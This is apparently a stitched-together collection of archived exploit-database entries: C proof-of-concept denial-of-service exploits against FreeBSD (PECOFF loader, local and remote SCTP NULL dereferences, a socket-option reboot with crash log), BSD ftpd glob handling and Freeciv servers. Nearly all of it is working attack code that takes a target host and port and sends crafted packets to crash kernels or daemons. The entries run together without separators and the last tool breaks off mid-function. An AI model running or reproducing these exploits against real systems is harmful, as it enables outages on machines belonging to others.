for(;;){}
}

// milw0rm.com [2006-10-13]
/* pecoff_panic.c
 *
 * by Shaun Colley, 20 July 2009
 *
 * this code will panic the freebsd kernel due to a bug in the PECOFF executable loader
 * code ('options PECOFF_SUPPORT' in kernel config or `kldload pecoff`)
 *
 * panic(9) is in vm_fault due to a page fault.  the panic seems to be caused in
 * generic_bcopy...probably hitting a guard page..maybe exploitable(??) but this is just
 * a DoS at the moment :)  (ugly code btw)
 *
 * tested on freebsd 7.2-RELEASE
 *
 * - shaun
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
int i, fd;
system("rm -rf evilprog.exe; touch evilprog.exe");
fd = open("evilprog.exe", O_WRONLY);
char buf[0x3a+2+0x04+4000];
buf[0] = 'M';
buf[1] = 'Z';  /* magic */
for(i = 2; i<0x3c; i++) buf[i] = 'a';
buf[0x3c] = 0xee;
buf[0x3d] = 0xee;
buf[0x3e] = 0xee;
buf[0x3f] = 0xee;
for(i = 0x40; i<(0x40+4000); i++) buf[i] = 0x61;
write(fd, buf, 0x3a+2+0x04+4000);
close(fd);
system("chmod 700 evilprog.exe");
system("./evilprog.exe");  /* run the dodgy PECOFF binary */
}

// milw0rm.com [2009-07-20]
/* fbsd-sctp-panic.c
 *
 * freebsd 7.2-RELEASE SCTP local kernel DoS (kern panic)
 * only tested on 7.2-RELEASE, probably older and newer builds are vuln.  as well
 * based on an unfixed bug found here: <http://www.freebsd.org/cgi/query-pr.cgi?pr=136803>
 *
 * by Shaun Colley <shaun@rsc.cx>, Wed 05 Aug 2009
 *
 * $ gcc fbsd-sctp-panic.c -o fbsd-sctp-panic && ./fbsd-sctp-panic
 * wait a few seconds..
 *
 * - shaun
 */

#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/time.h>
#include <fcntl.h>

int csock, sock, lsock;

void *accept_connection() {
	struct sockaddr_in sin;
	socklen_t size = sizeof(sin);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(0x7f000001);
	sin.sin_port = htons(1337);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	bind(sock, (struct sockaddr *)&sin, sizeof(sin));
	listen(sock, 1);
	lsock = accept(sock, (struct sockaddr *)&sin, &size);
}

void recvdata() {
	int flag;
	struct sctp_sndrcvinfo recvinfo;
	char buf[10];
	sctp_recvmsg(csock, buf, sizeof(buf), NULL, 0, &recvinfo, &flag);
}

void make_connection() {
	struct sockaddr_in consin;
	struct sctp_sndrcvinfo sinfo;

	csock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	consin.sin_family = AF_INET;
	consin.sin_addr.s_addr = htonl(0x7f000001);
	consin.sin_port = htons(1337);

	connect(csock, (struct sockaddr *)&consin, sizeof(consin));
	signal(SIGALRM, recvdata);
	sinfo.sinfo_stream = 1337;
	sctp_send(lsock, "pwned", sizeof("pwned"), &sinfo, 0);
}


int main() {

	alarm(2);
	signal(SIGALRM, make_connection);
	accept_connection();

	return 0;
}

// milw0rm.com [2009-08-06]
# Exploit Title: FreeBSD local denial of service - forced reboot
# Date: 28. January 2011
# Author: Kingcope
# Software Link: http://www.freebsd.org
# Operating System: FreeBSD
# Tested on: 8.0-RELEASE

This source code when compiled and executed
will reboot at least FreeBSD 8.0-RELEASE because of a null pointer dereference.

#include <sys/types.h>
#include <sys/mman.h>
#define PAGE_SIZE 4096
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
main() {
       int k,fd,i2,i3,i4,i5,i6,i7,i8;
char *p;
      char buf[4096];

      for (i2=0;i2<256;i2++) {
       for (i3=0;i3<2;i3++) {
       for (i4=0;i4<2;i4++) {
       fd = socket(i2, i3, i4);
       if (fd < 0) continue;
       printf("SUCCESS!\n");
       for (i5=0;i5<100;i5++) {
       for (i6=0;i6<100;i6++) {
       setsockopt(fd, i5, i6, buf, 4);
       getsockopt(fd, i5, i6, buf, &i7);
       }}}}}
}

The crash dump looks like the following.

Jan 28 11:33:07 r00tme kernel:
Jan 28 11:33:07 r00tme kernel:
Jan 28 11:33:07 r00tme kernel: Fatal trap 12: page fault while in kernel mode
Jan 28 11:33:07 r00tme kernel: cpuid = 0; apic id = 00
Jan 28 11:33:07 r00tme kernel: fault virtual address    = 0xc
Jan 28 11:33:07 r00tme kernel: fault code               = supervisor
write, page not present
Jan 28 11:33:07 r00tme kernel: instruction pointer      = 0x20:0xc06143ba
Jan 28 11:33:07 r00tme kernel: stack pointer            = 0x28:0xcd1fa5b4
Jan 28 11:33:07 r00tme kernel: frame pointer            = 0x28:0xcd1fa85c
Jan 28 11:33:07 r00tme kernel: code segment             = base 0x0,
limit 0xfffff, type 0x1b
Jan 28 11:33:07 r00tme kernel: = DPL 0, pres 1, def32 1, gran 1
Jan 28 11:33:07 r00tme kernel: processor eflags = interrupt enabled,
resume, IOPL = 0
Jan 28 11:33:07 r00tme kernel: current process          = 1004 (bsdcrash)
Jan 28 11:33:07 r00tme kernel: trap number              = 12
Jan 28 11:33:07 r00tme kernel: panic: page fault
Jan 28 11:33:07 r00tme kernel: cpuid = 0
Jan 28 11:33:07 r00tme kernel: Uptime: 2m48s
Jan 28 11:33:07 r00tme kernel: Cannot dump. Device not defined or unavailable.
Jan 28 11:33:07 r00tme kernel: Automatic reboot in 15 seconds - press
a key on the console to abort
Jan 28 11:33:07 r00tme kernel: Rebooting...

The cause of the crash seems to be a specific network driver. Since
the crash is forced (only?) in a VMWare virtual machine the
exploitability can be dependent on the loaded device drivers
and installed hardware.source: http://www.securityfocus.com/bid/38559/info

The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service vulnerability because of a NULL-pointer dereference.

Successful exploits may allow remote attackers to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.

This issue affects the following releases:

FreeBSD 8.0, 6.3, 4.9
OpenBSD 4.5 and 4.6 

#include <glob.h>
#include <stdio.h>

#define MAXUSRARGS      100
#define MAXGLOBARGS     1000

void do_glob() {
        glob_t gl;
        char **pop;

        char buffer[256];
        strcpy(buffer, "{A*/../A*/../A*/../A*/../A*/../A*/../A*}");

        int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
        memset(&gl, 0, sizeof(gl));
        gl.gl_matchc = MAXGLOBARGS;
        flags |= GLOB_LIMIT;
        if (glob(buffer, flags, NULL, &gl)) {
                printf("GLOB FAILED!\n");
                return 0;
        }
        else
//                for (pop = gl.gl_pathv; pop && *pop && 1 <
(MAXGLOBARGS-1);
                for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);
                     pop++) {
                        printf("glob success");
                        return 0;
                }
        globfree(&gl);
}

main(int argc, char **argv) {
        do_glob();
        do_glob();
}
/*FreeBSD and OpenBSD 'ftpd' NULL Pointer Dereference Denial Of Service Vulnerability

The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service vulnerability because of a NULL-pointer dereference.

Successful exploits may allow remote attackers to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.

This issue affects the following releases:

FreeBSD 8.0, 6.3, 4.9
OpenBSD 4.5 and 4.6 

PoC:
*/

#include <glob.h>
#include <stdio.h>

#define MAXUSRARGS      100
#define MAXGLOBARGS     1000

void do_glob() {
        glob_t gl;
        char **pop;

        char buffer[256];
        strcpy(buffer, "{A*/../A*/../A*/../A*/../A*/../A*/../A*}");

        int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
        memset(&gl, 0, sizeof(gl));
        gl.gl_matchc = MAXGLOBARGS;
        flags |= GLOB_LIMIT;
        if (glob(buffer, flags, NULL, &gl)) {
                printf("GLOB FAILED!\n");
                return 0;
        }
        else
//                for (pop = gl.gl_pathv; pop && *pop && 1 <
(MAXGLOBARGS-1);
                for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);
                     pop++) {
                        printf("glob success");
                        return 0;
                }
        globfree(&gl);
}

main(int argc, char **argv) {
        do_glob();
        do_glob();
}
/*
 * FreeBSD kernel SCTP (latest release) remote NULL ptr dereference DoS
 * 
 * by Shaun Colley <scolley@ioactive.com>, 2 Aug 2012 
 *
 * The SCTP implementation used by FreeBSD ("reference implementation") is vulnerable to a remote 
 * NULL pointer dereference in kernel due to a logic bug. When parsing ASCONF chunks, an attempt is
 * made to find an association by address. if the address found is INADDR_ANY, sctp_findassoc_by_vtag()
 * is called and an attempt is made to find an association by vtag. Before searching for the vtag in a 
 * hash table, a pointer is set to NULL, with the intention of redefining it after finding the association. 
 * However, if the specified vtag is not found, the function returns and the ptr is never reinitialised, 
 * causing a kernel panic when the NULL pointer is later dereferenced by the SCTP_INP_DECR_REF macro when 
 * flow returns to sctp_process_control(). 
 *  
 * i.e.
 *
 *         static struct sctp_tcb *
 *             sctp_findassoc_by_vtag(struct sockaddr *from, uint32_t vtag,
 *                    struct sctp_inpcb **inp_p, struct sctp_nets **netp, uint16_t rport,
 *                     uint16_t lport, int skip_src_check)
 *            
 *	     {
 *           
 *	     [ ... ]
 *
 *          *netp = NULL;
 *            *inp_p = NULL;
 *     
 *           [ ... ]
 *
 *           head = &sctppcbinfo.sctp_asochash[SCTP_PCBHASH_ASOC(vtag,
 *			 1690             sctppcbinfo.hashasocmark)];
 *           if (head == NULL) {
 *	            // invalid vtag 
 *	            SCTP_INP_INFO_RUNLOCK();
 *	            return (NULL);
 *	    }
 *
 * The page fault is a write AV at 0x0 + 0x33c but since there is no associated user context, this
 * doesn't appear to be exploitable (i.e. by mapping the NULL page)
 *
 * Tested against FreebSD 8.2-RELEASE but latest release is also vulnerable. The target system must have an open
 * SCTP port
 *
 */

#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
#include <fcntl.h> 
#include <netinet/ip.h> 
#include <netdb.h>
#include <string.h>

/* sctp checksum implementation, basically ripped from wireshark */
#define SP_LEN 2
#define DP_LEN 2
#define VTAG_LEN 4
#define CHK_LEN 4
#define HEADER_LEN    (SP_LEN + DP_LEN + VTAG_LEN + CHK_LEN)
#define CRC32C(c, d) (c = (c >> 8) ^ crc_c[(c ^(d)) & 0xFF])

/* SCTP chunk types */
#define SCTP_AUTH       0x0f
#define SCTP_ASCONF 	0xc1

static int crc_c[256] = {
	0x00000000L, 0xF26B8303L, 0xE13B70F7L, 0x1350F3F4L,
	0xC79A971FL, 0x35F1141CL, 0x26A1E7E8L, 0xD4CA64EBL,
	0x8AD958CFL, 0x78B2DBCCL, 0x6BE22838L, 0x9989AB3BL,
	0x4D43CFD0L, 0xBF284CD3L, 0xAC78BF27L, 0x5E133C24L,
	0x105EC76FL, 0xE235446CL, 0xF165B798L, 0x030E349BL,
	0xD7C45070L, 0x25AFD373L, 0x36FF2087L, 0xC494A384L,
	0x9A879FA0L, 0x68EC1CA3L, 0x7BBCEF57L, 0x89D76C54L,
	0x5D1D08BFL, 0xAF768BBCL, 0xBC267848L, 0x4E4DFB4BL,
	0x20BD8EDEL, 0xD2D60DDDL, 0xC186FE29L, 0x33ED7D2AL,
	0xE72719C1L, 0x154C9AC2L, 0x061C6936L, 0xF477EA35L,
	0xAA64D611L, 0x580F5512L, 0x4B5FA6E6L, 0xB93425E5L,
	0x6DFE410EL, 0x9F95C20DL, 0x8CC531F9L, 0x7EAEB2FAL,
	0x30E349B1L, 0xC288CAB2L, 0xD1D83946L, 0x23B3BA45L,
	0xF779DEAEL, 0x05125DADL, 0x1642AE59L, 0xE4292D5AL,
	0xBA3A117EL, 0x4851927DL, 0x5B016189L, 0xA96AE28AL,
	0x7DA08661L, 0x8FCB0562L, 0x9C9BF696L, 0x6EF07595L,
	0x417B1DBCL, 0xB3109EBFL, 0xA0406D4BL, 0x522BEE48L,
	0x86E18AA3L, 0x748A09A0L, 0x67DAFA54L, 0x95B17957L,
	0xCBA24573L, 0x39C9C670L, 0x2A993584L, 0xD8F2B687L,
	0x0C38D26CL, 0xFE53516FL, 0xED03A29BL, 0x1F682198L,
	0x5125DAD3L, 0xA34E59D0L, 0xB01EAA24L, 0x42752927L,
	0x96BF4DCCL, 0x64D4CECFL, 0x77843D3BL, 0x85EFBE38L,
	0xDBFC821CL, 0x2997011FL, 0x3AC7F2EBL, 0xC8AC71E8L,
	0x1C661503L, 0xEE0D9600L, 0xFD5D65F4L, 0x0F36E6F7L,
	0x61C69362L, 0x93AD1061L, 0x80FDE395L, 0x72966096L,
	0xA65C047DL, 0x5437877EL, 0x4767748AL, 0xB50CF789L,
	0xEB1FCBADL, 0x197448AEL, 0x0A24BB5AL, 0xF84F3859L,
	0x2C855CB2L, 0xDEEEDFB1L, 0xCDBE2C45L, 0x3FD5AF46L,
	0x7198540DL, 0x83F3D70EL, 0x90A324FAL, 0x62C8A7F9L,
	0xB602C312L, 0x44694011L, 0x5739B3E5L, 0xA55230E6L,
	0xFB410CC2L, 0x092A8FC1L, 0x1A7A7C35L, 0xE811FF36L,
	0x3CDB9BDDL, 0xCEB018DEL, 0xDDE0EB2AL, 0x2F8B6829L,
	0x82F63B78L, 0x709DB87BL, 0x63CD4B8FL, 0x91A6C88CL,
	0x456CAC67L, 0xB7072F64L, 0xA457DC90L, 0x563C5F93L,
	0x082F63B7L, 0xFA44E0B4L, 0xE9141340L, 0x1B7F9043L,
	0xCFB5F4A8L, 0x3DDE77ABL, 0x2E8E845FL, 0xDCE5075CL,
	0x92A8FC17L, 0x60C37F14L, 0x73938CE0L, 0x81F80FE3L,
	0x55326B08L, 0xA759E80BL, 0xB4091BFFL, 0x466298FCL,
	0x1871A4D8L, 0xEA1A27DBL, 0xF94AD42FL, 0x0B21572CL,
	0xDFEB33C7L, 0x2D80B0C4L, 0x3ED04330L, 0xCCBBC033L,
	0xA24BB5A6L, 0x502036A5L, 0x4370C551L, 0xB11B4652L,
	0x65D122B9L, 0x97BAA1BAL, 0x84EA524EL, 0x7681D14DL,
	0x2892ED69L, 0xDAF96E6AL, 0xC9A99D9EL, 0x3BC21E9DL,
	0xEF087A76L, 0x1D63F975L, 0x0E330A81L, 0xFC588982L,
	0xB21572C9L, 0x407EF1CAL, 0x532E023EL, 0xA145813DL,
	0x758FE5D6L, 0x87E466D5L, 0x94B49521L, 0x66DF1622L,
	0x38CC2A06L, 0xCAA7A905L, 0xD9F75AF1L, 0x2B9CD9F2L,
	0xFF56BD19L, 0x0D3D3E1AL, 0x1E6DCDEEL, 0xEC064EEDL,
	0xC38D26C4L, 0x31E6A5C7L, 0x22B65633L, 0xD0DDD530L,
	0x0417B1DBL, 0xF67C32D8L, 0xE52CC12CL, 0x1747422FL,
	0x49547E0BL, 0xBB3FFD08L, 0xA86F0EFCL, 0x5A048DFFL,
	0x8ECEE914L, 0x7CA56A17L, 0x6FF599E3L, 0x9D9E1AE0L,
	0xD3D3E1ABL, 0x21B862A8L, 0x32E8915CL, 0xC083125FL,
	0x144976B4L, 0xE622F5B7L, 0xF5720643L, 0x07198540L,
	0x590AB964L, 0xAB613A67L, 0xB831C993L, 0x4A5A4A90L,
	0x9E902E7BL, 0x6CFBAD78L, 0x7FAB5E8CL, 0x8DC0DD8FL,
	0xE330A81AL, 0x115B2B19L, 0x020BD8EDL, 0xF0605BEEL,
	0x24AA3F05L, 0xD6C1BC06L, 0xC5914FF2L, 0x37FACCF1L,
	0x69E9F0D5L, 0x9B8273D6L, 0x88D28022L, 0x7AB90321L,
	0xAE7367CAL, 0x5C18E4C9L, 0x4F48173DL, 0xBD23943EL,
	0xF36E6F75L, 0x0105EC76L, 0x12551F82L, 0xE03E9C81L,
	0x34F4F86AL, 0xC69F7B69L, 0xD5CF889DL, 0x27A40B9EL,
	0x79B737BAL, 0x8BDCB4B9L, 0x988C474DL, 0x6AE7C44EL,
	0xBE2DA0A5L, 0x4C4623A6L, 0x5F16D052L, 0xAD7D5351L,
};

static unsigned int sctp_crc32c(const unsigned char *buf, unsigned int len) {

	unsigned int i;
	unsigned int crc32 = ~0U;
	unsigned int r;
	unsigned char b0, b1, b2, b3;

	for(i = 0; i < SP_LEN + DP_LEN + VTAG_LEN; i++) 
		CRC32C(crc32, buf[i]);

	CRC32C(crc32, 0);
	CRC32C(crc32, 0);
	CRC32C(crc32, 0);
	CRC32C(crc32, 0);
	for (i = HEADER_LEN; i < len; i++)
		CRC32C(crc32, buf[i]);

	r = ~crc32;

	b0 = r & 0xff;
	b1 = (r >> 8) & 0xff;
	b2 = (r >> 16) & 0xff;
	b3 = (r >> 24) & 0xff;
	crc32 = ((b0 << 24) | (b1 << 16) | (b2 << 8) | b3);
	return crc32;
}


/* basic sctp header */
struct sctphdr {
	unsigned short sport;
	unsigned short dport;
	unsigned int vtag;
	unsigned csum;
};

/* sctp chunk header */
struct sctp_chunkhdr {
	unsigned char type;
	unsigned char flags;
	unsigned short length;
};

/* ASCONF chunk */
struct sctp_asconf_chunk {
    struct sctp_chunkhdr ch;
    unsigned int serial;
};

/* AUTH chunk */
struct sctp_auth_chunk {
    struct sctp_chunkhdr ch;
    unsigned short shared_key_id;
    unsigned short hmac_id;
    unsigned char hmac[0];
};

/* SCTP parameter header */
struct sctp_paramhdr {
	unsigned short type;
	unsigned short length;
};

/* ipv4 address parameter */
struct sctp_ipv4addr_param {
	struct sctp_paramhdr ph; 
	unsigned int addr;
};


/* standard crc32 IP checksum */
unsigned short checksum(unsigned short *addr, int len) {

	int nleft = len;
	unsigned int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while(nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if(nleft == 1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer; 
}

int main(int argc, char *argv[]) {

	int sock = 0, ret = 0;
	int on = 1; /* for setsockopt() call */
	struct ip *iph = NULL;
	struct sctphdr *sctph = NULL;
	struct sctp_auth_chunk *auth_chunk = NULL;
	struct sctp_asconf_chunk *asconf_chunk = NULL;
        struct sctp_ipv4addr_param *ipv4_addr = NULL;

	char *crash = NULL;
	struct sockaddr_in sin;
	struct hostent *hp = NULL;

	printf("\n[*] freebsd sctp remote NULL ptr dereference\n\n");

	if(argc < 3) {
		printf("usage: %s <host> <port>\n\n", argv[0]);
		return -1;
	}

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP);
	if(sock < 0) {
		printf("[*] error making socket!\n");
		return -1;
	}

	/* tell the kernel not to put any IP headers in */
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		printf("[*] setsockopt() error\n");
		return -1;
	}

	hp = gethostbyname(argv[1]);
	if(!hp) {
		printf("[*] couldn't resolve %s\n\n", argv[1]);
		return -1;
	}

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(argv[2]));
	memcpy((char *)&sin.sin_addr, hp->h_addr, hp->h_length);
	
	crash = malloc(20000);
	if(!crash) {
		printf("\n[*] couldn't allocate memory\n");
		return -1;
	}

	printf("[*] building crash packet..\n");

	memset(crash, 0x00, 20000);
	
	/* fill in IP header */
	iph = (struct ip *)crash;
	iph->ip_hl = 5;
  	iph->ip_v = 4;
  	iph->ip_tos = 0;
        iph->ip_len = 0; /* fill in later when we know... */
  	iph->ip_id = htons(1337);
  	iph->ip_off = 0;
  	iph->ip_ttl = 250;
  	iph->ip_p = 132; /* sctp */
  	iph->ip_sum = 0;

	iph->ip_src.s_addr = inet_addr("1.3.3.7");
  	iph->ip_dst.s_addr = sin.sin_addr.s_addr;

	/* fill in SCTP header */
	sctph = (void *)crash + sizeof(struct ip); 
	sctph->sport = htons(0x1234); 
	sctph->dport = htons(atoi(argv[2]));
	sctph->vtag = htonl(0x12345);  /* deliberately wrong */
	sctph->csum = 0;

	/* build AUTH chunk */
	auth_chunk = (void *)crash + sizeof(struct ip) + sizeof(struct sctphdr);
	auth_chunk->ch.type = SCTP_AUTH;
	auth_chunk->ch.length = htons(8 + sizeof(struct sctp_auth_chunk));
        auth_chunk->hmac_id = htons(0x1337);
        memset((void *)auth_chunk->hmac, 0x61, 8); 
    
        /* build ASCONF chunk */
        asconf_chunk = (void *)crash + sizeof(struct ip) + sizeof(struct sctphdr) + sizeof(struct sctp_auth_chunk) + 8;
        asconf_chunk->ch.type = SCTP_ASCONF;
        asconf_chunk->ch.length = htons(sizeof(struct sctp_asconf_chunk) + sizeof(struct sctp_ipv4addr_param));
        asconf_chunk->serial = 0x41414141; /* whatever */
    
        ipv4_addr = (void *)crash + sizeof(struct ip) + sizeof(struct sctphdr) + sizeof(struct sctp_auth_chunk) 
                                                                        + 8 + sizeof(struct sctp_asconf_chunk);
	
	ipv4_addr->ph.length = htons(sizeof(struct sctp_ipv4addr_param));
        ipv4_addr->ph.type = htons(0x0005);
        ipv4_addr->addr = INADDR_ANY; /* this takes us down the bad code path */ 
    
        /* what's the length of the whole packet? */
        iph->ip_len = sizeof(struct ip) + sizeof(struct sctphdr) + sizeof(struct sctp_auth_chunk) + 8 + sizeof(struct sctp_asconf_chunk) 
                                                                                              + sizeof(struct sctp_ipv4addr_param);
    
        /* calculate IP checksum */
	iph->ip_sum = checksum((unsigned short *)crash, iph->ip_len >> 1);

	/* calculate SCTP checksum */
	sctph->csum = htonl(sctp_crc32c((const unsigned char *)sctph, sizeof(struct sctphdr) + sizeof(struct sctp_auth_chunk) + 8 
                                                                                           + sizeof(struct sctp_asconf_chunk) 
                                                                                         + sizeof(struct sctp_ipv4addr_param)));

	printf("[*] sending packet..\n\n");

	/* send the bad packet */
	ret = sendto(sock, crash, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
	if(ret < 0) {
		printf("[*] error sending packet\n");
		return -1;
	}

	printf("[*] done, bad packet sent!\n\n");

	free(crash);
	close(sock);

	return 0;

}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}



    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER             "0.1"
#define PORT            5555
#define JUMBO_SIZE      0xffff



u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   boomsz;
    int     sd,
            i;
    u_short port = PORT;
    u_char  buff[6];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    srand(time(NULL));
    setbuf(stdout, NULL);

    fputs("\n"
        "Freeciv <= 2.0.7 jumbo malloc crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    printf("- connect...");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    printf(" done\n");

    boomsz = 6 + (rand() * 1234);
    for(;;) {
        if(!boomsz) boomsz++;
        if(boomsz > 0) boomsz = -boomsz;
        if((u_int)((boomsz - 6) * 100) > 0x7fffffff) break;
        boomsz *= 1234;     // more than 2 gigabytes, I want to be sure
    }

    *(u_short *)buff     = JUMBO_SIZE;
    *(u_int *)(buff + 2) = htonl(boomsz);

    //  int compressed_size = whole_packet_len - header_size;   // header_size = 6
    //  long int decompressed_size = 100 * compressed_size;

    printf("- send BOOM data (try to allocate %u bytes on the remote system)\n",
        (u_int)(ntohl(*(u_int *)(buff + 2)) - 6) * 100);
    if(send(sd, buff, 6, 0)
      < 0) std_err();

    printf("- wait some seconds:\n");
    for(i = 3; i >= 0; i--) {
        printf("%3d\r", i);
        sleep(ONESEC);
    }

    close(sd);
    printf(
        "- the server should be crashed or freezed, check it manually\n"
        "  if it's still online retry again with this tool or the server is patched\n"
        "\n");
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2006-03-06]
/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define strnicmp strncasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        5556
#define BUFFSZ      0xffff  // max block size



int putcc(u8 *data, int chr, int size);
int putxx(u8 *data, u32 num, int bits);
int putss(u8 *data, u8 *str);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



#define JUMBO_SIZE  0xffff
enum packet_type {
    // I have cut the previouses, since not needed
    PACKET_GAME_INFO    = 15,
    PACKET_PLAYER_INFO  = 39,
    PACKET_EDIT_CITY    = 167,
    PACKET_EDIT_PLAYER_CREATE,
    PACKET_EDIT_PLAYER_REMOVE,
    PACKET_EDIT_PLAYER
};



int main(int argc, char *argv[]) {
    static struct   linger  ling = {1,1};
    struct  sockaddr_in peer;
    int     sd,
            bug;
    u16     port    = PORT;
    u8      *buff,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "Freeciv <= 2.2.1 Denials of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stderr);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%u)]\n"
            "\n"
            "Bugs:\n"
            " 1 = malloc exception\n"
            " 2 = endless loop\n"
            "\n", argv[0], port);
        exit(1);
    }
    bug  = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

